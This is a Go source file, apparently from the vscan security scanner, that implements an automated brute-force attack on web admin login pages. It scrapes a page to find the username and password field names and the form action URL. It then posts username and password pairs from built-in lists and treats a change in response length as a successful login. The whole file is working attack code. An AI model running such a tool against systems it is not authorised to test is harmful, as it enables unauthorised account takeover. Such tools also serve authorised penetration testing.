package brute

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/url"
	"regexp"
	"strings"
)

func getinput(domainurl string) (usernamekey string, passwordkey string, domainurlx string) {
	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return "", "", ""
	}
	var username = "username"
	var password = "password"
	var loginurl = domainurl + "/login"
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return "", "", ""
		}
	}
	userreg := regexp.MustCompile(`<input.*?name="(\w*?name\w*?|\w*?Name\w*?|\w*?user\w*?|\w*?User\w*?|\w*?USER\w*?)".*?>`)
	usernamelist := userreg.FindStringSubmatch(req.Body)
	if usernamelist != nil {
		username = usernamelist[len(usernamelist)-1:][0]
	}
	passreg := regexp.MustCompile(`<input.*?name="(\w*?pass\w*?|\w*?Pass\w*?|\w*?PASS\w*?|\w*?pwd\w*?|\w*?Pwd\w*?|\w*?PWD\w*?)".*?>`)
	passlist := passreg.FindStringSubmatch(req.Body)
	if passlist != nil {
		password = passlist[len(passlist)-1:][0]
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = domainx
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = u.Scheme + "://" + u.Host + domainlist[len(domainlist)-1:][0]
		} else {
			loginurl = domainurl + "/" + domainlist[len(domainlist)-1:][0]
		}
	} else {
		domainreg2 := regexp.MustCompile(`,\s+url.*?:.*?"(.*?)",`)
		domainlist2 := domainreg2.FindStringSubmatch(req.Body)
		if domainlist2 != nil {
			domainx := domainlist2[len(domainlist2)-1:][0]
			if strings.Contains(domainx, "http") {
				loginurl = domainx
			} else if domainx == "" {
				loginurl = loginurl
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = u.Scheme + "://" + u.Host + domainlist2[len(domainlist2)-1:][0]
			} else {
				loginurl = domainurl + "/" + domainlist2[len(domainlist2)-1:][0]
			}
		}
	}
	return username, password, loginurl
}

func Admin_brute(url string) (username string, password string, loginurl string) {
	usernamekey, passwordkey, loginurl := getinput(url)
	if loginurl != "" {
		if req, err := pkg.HttpRequset(loginurl, "POST", fmt.Sprintf("%s=admin&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey), false, nil); err == nil {
			for useri := range usernames {
				for passi := range top100pass {
					if req2, err2 := pkg.HttpRequset(loginurl, "POST", fmt.Sprintf("%s=%s&%s=%s", usernamekey, usernames[useri], passwordkey, top100pass[passi]), false, nil); err2 == nil {
						if req2.ContentLength != req.ContentLength && !strings.Contains(req2.Body, top100pass[passi]) {
							fmt.Printf("admin-brute-sucess|%s:%s|%s\n", usernames[useri], top100pass[passi], loginurl)
							return usernames[useri], top100pass[passi], loginurl
						}
					}
				}
			}
		}
	}
	return "", "", ""
}
